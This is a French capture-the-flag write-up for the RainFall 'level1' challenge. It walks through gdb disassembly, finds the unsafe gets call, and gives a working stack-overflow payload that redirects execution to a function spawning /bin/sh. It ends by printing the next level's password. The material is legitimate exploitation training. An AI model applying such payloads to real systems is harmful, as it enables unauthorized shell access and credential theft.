On analyse l'executable level1 avec gdb:

(gdb) disas main
Dump of assembler code for function main:
	0x08048480 <+0>:	push	%ebp
	0x08048481 <+1>:	mov	 %esp,%ebp
	0x08048483 <+3>:	and	 $0xfffffff0,%esp
	0x08048486 <+6>:	sub	 $0x50,%esp
	0x08048489 <+9>:	lea	 0x10(%esp),%eax
	0x0804848d <+13>:	mov	 %eax,(%esp)
	0x08048490 <+16>:	call	0x8048340 <gets@plt>
	0x08048495 <+21>:	leave  
	0x08048496 <+22>:	ret	 
End of assembler dump.

On constate rien de particulier si ce n'est l'appel de la fonction
gets qui peut être exploitée par buffer overflow. 

(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini

on remarque qu'il y a un appel system et une fonction qui semble
avoit ete code : run

(gdb) disas run
Dump of assembler code for function run:
	0x08048444 <+0>:	push	%ebp
	0x08048445 <+1>:	mov	 %esp,%ebp
	0x08048447 <+3>:	sub	 $0x18,%esp
	0x0804844a <+6>:	mov	 0x80497c0,%eax
	0x0804844f <+11>:	mov	 %eax,%edx
	0x08048451 <+13>:	mov	 $0x8048570,%eax
	0x08048456 <+18>:	mov	 %edx,0xc(%esp)
	0x0804845a <+22>:	movl	$0x13,0x8(%esp)
	0x08048462 <+30>:	movl	$0x1,0x4(%esp)
	0x0804846a <+38>:	mov	 %eax,(%esp)
	0x0804846d <+41>:	call	0x8048350 <fwrite@plt>
	0x08048472 <+46>:	movl	$0x8048584,(%esp)
	0x08048479 <+53>:	call	0x8048360 <system@plt>
	0x0804847e <+58>:	leave  
	0x0804847f <+59>:	ret	 
End of assembler dump.

La fonction run utilise fwrite pour afficher "Good... Wait what?\n" sur 
la sortie standard puis execute /bin/sh sur un appel system. 
L'objectif est de overwrite la valeur de RET dans main avec l'adresse de la fonction
RUN pour forcer son execution. 

level1@RainFall:~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
level1@RainFall:~$ cat /tmp/exploit - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
